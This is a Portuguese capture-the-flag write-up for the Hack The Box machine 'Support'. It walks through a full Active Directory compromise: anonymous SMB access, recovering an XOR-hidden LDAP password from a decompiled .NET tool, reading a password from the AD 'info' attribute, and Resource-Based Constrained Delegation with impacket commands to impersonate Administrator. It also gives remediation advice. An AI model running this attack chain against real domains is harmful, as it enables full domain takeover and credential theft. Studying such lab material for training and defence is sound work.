# HTB - Support (Windows / Active Directory)

## Objetivo

Comprometer totalmente o Domain Controller da máquina **Support** (HTB), obtendo acesso inicial via enumeração de SMB anônima, extraindo credenciais de uma ferramenta interna customizada, e escalando até Domain Admin através de abuso de permissão `GenericAll` sobre o objeto de computador do DC (Resource-Based Constrained Delegation).

## Target / Lab Context

- **Plataforma:** Hack The Box
- **Máquina:** Support
- **IP:** 10.129.63.203
- **Domínio:** support.htb
- **Hostname do DC:** DC (dc.support.htb)
- **SO:** Windows Server 2022 Build 20348
- **Ambiente:** Laboratório autorizado (HTB), sem impacto em sistemas de produção

## Vulnerabilidade

Cadeia de comprometimento composta por três falhas encadeadas:

1. **Exposição de ferramenta interna via share SMB anônimo** — um binário .NET customizado (`UserInfo.exe`) ficou esquecido num share de "ferramentas de suporte" acessível sem autenticação.
2. **Criptografia caseira e reversível** — a senha de uma conta de serviço LDAP estava embutida no binário, "protegida" por um esquema de XOR simples com chave fixa.
3. **Atributo `info` do AD usado como bloco de notas** — a senha em texto claro do usuário `support` estava anotada no campo `info` do próprio objeto de usuário, legível por qualquer conta autenticada.
4. **GenericAll sobre objeto de computador do DC** — o usuário `support` (via grupo `Shared Support Accounts`) tinha controle total sobre o objeto `DC.SUPPORT.HTB`, permitindo abuso de RBCD (Resource-Based Constrained Delegation) para se passar por Administrator.

## Metodologia

Abordagem padrão de pentest interno de AD: reconhecimento de portas → enumeração SMB anônima → coleta de arquivos → engenharia reversa de binário → obtenção de credencial → enumeração LDAP autenticada → identificação de ACL abusável → abuso de delegação → shell administrativo.

## Exploração

### Análise do binário customizado

Extração do zip revelou um executável .NET Framework 4.8 com dependências (`CommandLineParser.dll`, `Microsoft.Extensions.*`) — assinatura típica de ferramenta interna feita sob demanda.

Busca de strings no config não revelou nada útil:

```bash
cat UserInfo.exe.config
```

Config só tinha bindings de assembly, sem segredos. Segui para decompilação.

**Tentativa falha #1:** instalar `dotnet-sdk-8.0` via `apt` — pacote não existe no repositório Kali.

**Tentativa falha #2:** `dotnet tool install -g ilspycmd` sem especificar versão — instalou a versão mais recente (10.x), incompatível com o SDK 6.0 disponível (`NU1202: Package ilspycmd 10.1.1.8388 is not compatible with net6.0`).

**Correção:** fixar versão compatível:

```bash
dotnet tool install -g ilspycmd --version 7.2.1.6295
export PATH="$PATH:$HOME/.dotnet/tools"
```

Decompilação:

```bash
mkdir decompiled
ilspycmd UserInfo.exe -o decompiled/
```

Busca por indícios de credenciais:

```bash
grep -r "password\|enc_password\|FromBase64" decompiled/ -ri
```

Resultado revelou a lógica completa:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    return Encoding.Default.GetString(array);
}
```

E o uso dessa senha:

```csharp
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

Ou seja: Base64 → XOR com chave `"armando"` (repetida em loop) → XOR adicional com `0xDF` fixo.

### Reversão da senha

```python
import base64
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc_password)
result = bytes([b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(data)])
print(result.decode())
```

Senha obtida: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

**Tentativa falha #3:** testar a credencial sem aspas no shell:

```bash
nxc smb 10.129.63.203 -u ldap -p nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

O `$` foi interpretado pelo zsh como expansão de variável, truncando a senha (`STATUS_LOGON_FAILURE`). Corrigido com aspas simples, que bloqueiam qualquer expansão do shell:

```bash
nxc smb 10.129.63.203 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Resultado: `[+] support.htb\ldap:...` — autenticação válida.

### Enumeração LDAP autenticada

```bash
nxc ldap 10.129.63.203 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```

Listou 20 usuários do domínio, incluindo `support`, `krbtgt`, `Administrator` e diversas contas nominais de funcionários.

O usuário `support` chamou atenção pelo nome — provável conta associada à ferramenta encontrada. Verificação do campo `info` (comum em ambientes reais como bloco de anotações administrativas, e frequentemente mal utilizado para guardar segredos):

**Tentativa falha #4:** bind com formato `DOMAIN\user`:

```bash
ldapsearch -x -H ldap://10.129.63.203 -D 'support.htb\ldap' -w '...' -b "dc=support,dc=htb" "(sAMAccountName=support)" info
```

Retornou `Invalid credentials (49)` — o `ldapsearch` com bind simples não aceita o formato NetBIOS `DOMINIO\usuario`; requer UPN.

**Correção:**

```bash
ldapsearch -x -H ldap://10.129.63.203 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(sAMAccountName=support)" info
```

Resultado:

```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
```

Senha do usuário `support` em texto claro, exposta no atributo `info`.

### Acesso via WinRM

Usuário `support` pertence ao grupo `Remote Management Users`, permitindo login interativo via WinRM (porta 5985):

```bash
evil-winrm -i 10.129.63.203 -u support -p 'Ironside47pleasure40Watchful'
```

Flag de usuário capturada:

```powershell
type C:\Users\support\Desktop\user.txt
```

### Escalada de privilégios — GenericAll + RBCD

Enumeração via BloodHound (dados coletados com `bloodhound-python`) mostrou que `support` (via grupo `Shared Support Accounts`) possui **GenericAll** sobre o objeto de computador `DC.SUPPORT.HTB` — controle total, incluindo capacidade de escrever no atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`, que controla Resource-Based Constrained Delegation (RBCD).

O ataque explora também o atributo de domínio `ms-DS-MachineAccountQuota` (padrão = 10), que permite a qualquer usuário autenticado criar contas de computador no domínio sem privilégio administrativo.

**Passo 1 — Criar computador falso:**

```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE01$' -computer-pass 'Senha123!' -dc-ip 10.129.63.203
```

**Passo 2 — Configurar delegação (RBCD):**

```bash
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write \
  support.htb/support:'Ironside47pleasure40Watchful'
```

**Passo 3 — Obter TGT do computador falso:**

```bash
impacket-getTGT support.htb/'FAKE01$':'Senha123!' -dc-ip 10.129.63.203
export KRB5CCNAME=FAKE01\$.ccache
```

**Passo 4 — S4U2Self/S4U2Proxy, personificando Administrator:**

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate administrator \
  support.htb/'FAKE01$':'Senha123!' -dc-ip 10.129.63.203
```

Ticket salvo como `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`.

**Tentativa falha #5:** apontar `KRB5CCNAME` para um nome de arquivo genérico (`administrator.ccache`) que não correspondia ao nome real gerado pelo Impacket:

```bash
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass dc.support.htb
# [-] [Errno 2] No such file or directory: 'administrator.ccache'
```

**Correção:** usar o nome exato do arquivo gerado no passo anterior:

```bash
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-wmiexec -k -no-pass dc.support.htb
```

## Resultado

Comprometimento completo do domínio `support.htb`, desde acesso anônimo via SMB até shell administrativo no Domain Controller, via cadeia: **share SMB exposto → engenharia reversa de binário .NET → credencial fraca de LDAP → campo `info` do AD → GenericAll sobre objeto de computador → RBCD → impersonação de Administrator**.

## Evidência

- Flag de usuário: `766f5b5c316cc19e499b29e45a758fd2` (`C:\Users\support\Desktop\user.txt`)
- Flag de root: capturada via `type C:\Users\Administrator\Desktop\root.txt` após acesso administrativo (Passo 5 de escalada)

## Lições Aprendidas

- Shares SMB "de suporte/TI" são alvo recorrente — ferramentas internas customizadas costumam ter credenciais hardcoded, diferente de instaladores públicos.
- "Criptografia" caseira (XOR com chave fixa) não é proteção real — qualquer pessoa com acesso ao binário decompilado consegue reverter o algoritmo em poucos minutos.
- O atributo `info` (e outros campos de descrição livre do AD) são lidos por qualquer usuário autenticado por padrão — nunca devem conter segredos.
- `GenericAll` sobre objeto de computador é caminho direto para RBCD quando `ms-DS-MachineAccountQuota` permite criação de contas de máquina por usuários comuns.
- Detalhes operacionais que custaram tempo: aspas em senhas com caracteres especiais no shell, versão compatível de ferramentas (.NET SDK x ilspycmd), formato de bind do `ldapsearch` (UPN vs NetBIOS), e nome exato de arquivos `.ccache` gerados pelo Impacket — a etapa de escalada falha silenciosamente se qualquer um desses detalhes for negligenciado.

## Mitigação / Remediação

- Restringir acesso anônimo (null session) a shares SMB; revisar periodicamente o conteúdo de shares "utilitários" em produção.
- Nunca embutir credenciais em binários, nem com criptografia própria — usar cofres de segredos (Azure Key Vault, HashiCorp Vault, gMSA) para contas de serviço.
- Auditar e limpar atributos de descrição/anotação (`info`, `description`) de objetos do AD; não usá-los para armazenar senhas.
- Reduzir `ms-DS-MachineAccountQuota` para 0 quando a criação de máquinas por usuários comuns não for necessária.
- Aplicar princípio de menor privilégio em ACLs de objetos de computador — evitar `GenericAll`/`GenericWrite` para grupos de suporte sobre o DC ou outros servidores críticos.
- Monitorar criação de novos objetos de computador e alterações em `msDS-AllowedToActOnBehalfOfOtherIdentity` via SIEM.

## Notas Finais

Máquina de dificuldade média que ilustra bem uma cadeia realista de comprometimento de AD: começa em superfície simples (SMB anônimo), passa por engenharia reversa leve, e termina em uma técnica moderna e amplamente usada em pentests reais (RBCD). Boa prática de fixação dos conceitos de `GenericAll`, `ms-DS-MachineAccountQuota` e do fluxo S4U2Self/S4U2Proxy do Kerberos.
